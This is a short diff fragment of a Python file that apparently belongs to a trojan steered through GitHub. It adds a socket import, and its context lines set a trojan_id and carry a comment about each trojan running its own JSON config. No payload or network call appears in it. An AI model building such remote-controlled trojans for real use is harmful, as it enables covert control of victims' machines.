@@ -8,6 +8,7 @@ import threading
 import Queue
 import os
 import pip
+import socket
 from github3 import login
 trojan_id = "abc"
 #each trojan exicutes the json file ment for him there is a json file called abc
